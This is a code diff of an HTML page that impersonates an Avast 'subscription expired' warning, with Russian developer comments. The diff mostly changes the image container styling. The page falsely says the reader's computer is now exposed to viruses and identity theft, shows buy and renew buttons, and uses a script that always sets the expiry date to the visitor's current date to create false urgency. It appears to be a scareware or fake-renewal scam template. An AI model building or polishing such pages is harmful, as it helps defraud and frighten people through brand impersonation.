@@ -132,37 +132,39 @@
             color: white;
         }
 
+        /* Квадратный контейнер для изображения */
+        .square-image-container {
+            max-width: 280px;
+            width: 100%;
+            aspect-ratio: 1 / 1;  /* строго квадрат */
+            margin: 0 auto;
+            background: #f4f7fc;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 6px 14px rgba(0, 0, 0, 0.05);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid #e2edf2;
+        }
+
+        .square-image-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;   /* картинка заполнит квадрат без искажений */
+            display: block;
+        }
+
+        /* Адаптив для маленьких экранов */
+        @media (max-width: 640px) {
+            .square-image-container {
+                max-width: 220px;
+            }
+        }
+
         .image-placeholder {
             margin: 1rem 0 1.2rem 0;
             text-align: center;
-            background: #fafcff;
-            border-radius: 24px;
-            padding: 0.5rem;
-            border: 1px dashed #cbd5e1;
-            transition: all 0.2s;
-        }
-
-        .image-placeholder img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 20px;
-            display: block;
-            margin: 0 auto;
-        }
-
-        .image-placeholder:empty::before {
-            content: "🖼️ Место для изображения (добавьте ваш рисунок)";
-            font-size: 0.85rem;
-            color: #6c7a89;
-            display: inline-block;
-            padding: 1rem 1.5rem;
-            background: #f1f5f9;
-            border-radius: 18px;
-            font-style: normal;
-        }
-
-        .image-placeholder:has(img):empty::before {
-            display: none;
         }
 
         .version-info {
@@ -274,7 +276,6 @@
 
         <div class="content">
             <h1 class="main-title">Your Avast antivirus subscription has expired!</h1>
-            <!-- Динамическая дата: всегда показывает текущую дату пользователя -->
             <p class="expiry-date" id="dynamicExpiryDate">Your subscription to Avast Total Protection has expired on <!-- дата будет вставлена --></p>
             
             <p class="warning-text">After the expiration date your computer becomes vulnerable to viruses, malicious software and identity theft.</p>
@@ -285,30 +286,31 @@
                 <a href="#" class="buy-link">[BUY NOW]</a>
             </p>
 
+            <!-- КВАДРАТНОЕ МЕСТО ДЛЯ КАРТИНКИ (соотношение 1:1) -->
             <div class="image-placeholder">
-                <img src="img/avast.jpg"
-                alt="PC unprotected warning"
-                style="width:100%; max-width:280px; margin:0 auto; display:block;">
+                <div class="square-image-container">
+                    <!-- Замените src на путь к вашему квадратному изображению -->
+                    <img src="https://placehold.co/400x400/eef2f6/6c7a89?text=Квадратное+изображение" 
+                         alt="Квадратная иллюстрация">
+                </div>
             </div>
 
             <div class="version-info">Avast AntiVirus 20.738.103 (10 DI VCI S)</div>
             
-                    
             <button class="renew-btn">Renew subscription</button>
         </div>
     </div>
 
     <script>
-        // Функция форматирования даты: день.месяц.год (без ведущих нулей, как в оригинале "5.7.2025")
+        // Функция форматирования даты: день.месяц.год (без ведущих нулей)
         function getCurrentDateFormatted() {
             const now = new Date();
-            const day = now.getDate();        // день без ведущего нуля
-            const month = now.getMonth() + 1; // месяц без ведущего нуля
+            const day = now.getDate();        
+            const month = now.getMonth() + 1; 
             const year = now.getFullYear();
             return `${day}.${month}.${year}`;
         }
 
-        // Вставляем актуальную дату в элемент expiry-date
         const expiryElement = document.getElementById('dynamicExpiryDate');
         if (expiryElement) {
             const currentDate = getCurrentDateFormatted();
